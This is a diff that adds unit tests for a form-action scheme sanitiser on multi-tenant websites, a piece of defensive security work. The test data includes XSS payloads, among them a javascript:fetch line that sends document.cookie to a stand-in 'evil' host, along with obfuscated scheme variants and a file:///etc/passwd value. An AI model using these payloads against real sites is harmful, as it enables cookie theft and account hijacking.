@@ -2,7 +2,9 @@ import assert from "node:assert/strict";
 import test from "node:test";
 
 import {
+  isSafeFormAction,
   neutralizeDangerousHref,
+  neutralizeFormAction,
   prefixPublicHref,
   prefixPublicHrefsDeep,
 } from "./public-hrefs";
@@ -157,6 +159,103 @@ test("prefixPublicHrefsDeep neutralizes dangerous CTA fields even on apex (empty
     (prefixPublicHrefsDeep({ href: "javascript:alert(1)" }, "/impronta") as { href: string }).href,
     "#",
   );
+});
+
+// ── SECURITY: form `action` scheme guard ───────────────────────────────────
+//
+// `<form action>` navigates on submit exactly like `<a href>` navigates on
+// click. Published tenant sites share the *.tulala.digital apex, so cookies
+// are parent-scoped and a script-capable action is cross-tenant exposure,
+// not self-XSS.
+
+test("neutralizeFormAction blocks script-capable form actions", () => {
+  assert.equal(neutralizeFormAction("javascript:alert(1)"), "#");
+  assert.equal(
+    neutralizeFormAction("javascript:fetch('https://evil/?c='+document.cookie)"),
+    "#",
+  );
+  assert.equal(neutralizeFormAction("JavaScript:alert(1)"), "#"); // case-insensitive
+  assert.equal(neutralizeFormAction("  javascript:alert(1)"), "#"); // leading space
+  assert.equal(neutralizeFormAction("data:text/html,<script>alert(1)</script>"), "#");
+  assert.equal(neutralizeFormAction("vbscript:msgbox(1)"), "#");
+  // Obfuscation the BROWSER normalizes away before parsing the scheme —
+  // embedded tab/newline/CR and leading C0 controls. Reuses hrefScheme, so
+  // these must be caught, not passed through.
+  assert.equal(neutralizeFormAction("java\tscript:alert(1)"), "#");
+  assert.equal(neutralizeFormAction("java\nscript:alert(1)"), "#");
+  assert.equal(neutralizeFormAction("java\rscript:alert(1)"), "#");
+  assert.equal(
+    neutralizeFormAction(String.fromCharCode(1, 2) + "javascript:alert(1)"),
+    "#",
+  );
+  // Allowlist, not denylist: unknown schemes are blocked too.
+  assert.equal(neutralizeFormAction("blob:https://x/abc"), "#");
+  assert.equal(neutralizeFormAction("file:///etc/passwd"), "#");
+});
+
+test("neutralizeFormAction preserves legitimate form actions", () => {
+  // Third-party form backends (Formspree, Netlify, custom API).
+  assert.equal(
+    neutralizeFormAction("https://formspree.io/f/abc123"),
+    "https://formspree.io/f/abc123",
+  );
+  assert.equal(neutralizeFormAction("http://example.com/submit"), "http://example.com/submit");
+  // Relative + root-relative endpoints.
+  assert.equal(neutralizeFormAction("/api/contact"), "/api/contact");
+  assert.equal(neutralizeFormAction("./submit"), "./submit");
+  assert.equal(neutralizeFormAction("?q=1"), "?q=1");
+  // mailto: form actions are a documented contact_form option.
+  assert.equal(neutralizeFormAction("mailto:hello@example.com"), "mailto:hello@example.com");
+  // The `internal…` routing sentinel must survive untouched, or every
+  // internally-routed form breaks (the component swaps it for
+  // /api/cms/forms/submit).
+  assert.equal(neutralizeFormAction("internal"), "internal");
+  assert.equal(neutralizeFormAction("internal:auto"), "internal:auto");
+  assert.equal(neutralizeFormAction("internal:inquiry"), "internal:inquiry");
+  assert.equal(neutralizeFormAction(" internal:auto "), " internal:auto ");
+});
+
+test("isSafeFormAction agrees with neutralizeFormAction (write-time gate)", () => {
+  for (const bad of [
+    "javascript:alert(1)",
+    "java\tscript:alert(1)",
+    "data:text/html,x",
+    "vbscript:x",
+    "blob:https://x/a",
+  ]) {
+    assert.equal(isSafeFormAction(bad), false, bad);
+  }
+  for (const good of [
+    "https://formspree.io/f/abc",
+    "/api/contact",
+    "mailto:hi@x.com",
+    "internal:auto",
+  ]) {
+    assert.equal(isSafeFormAction(good), true, good);
+  }
+});
+
+test("prefixPublicHrefsDeep guards `action` without tenant-prefixing it", () => {
+  const input = {
+    nested: {
+      action: "javascript:fetch('https://evil/?c='+document.cookie),",
+    },
+  };
+  assert.deepEqual(prefixPublicHrefsDeep(input, "/impronta"), {
+    nested: { action: "#" },
+  });
+  // Apex surface (empty prefix) must neutralize too.
+  assert.deepEqual(prefixPublicHrefsDeep({ action: "data:text/html,x" }, ""), {
+    action: "#",
+  });
+  // A form action is an ENDPOINT, not a page route — never tenant-prefixed,
+  // or `/api/contact` would 404 as `/impronta/api/contact`.
+  assert.deepEqual(prefixPublicHrefsDeep({ action: "/api/contact" }, "/impronta"), {
+    action: "/api/contact",
+  });
+  assert.deepEqual(prefixPublicHrefsDeep({ action: "internal:auto" }, "/impronta"), {
+    action: "internal:auto",
+  });
 });
 
 test("publicLocaleHref preserves tenant slug before locale prefixing", () => {
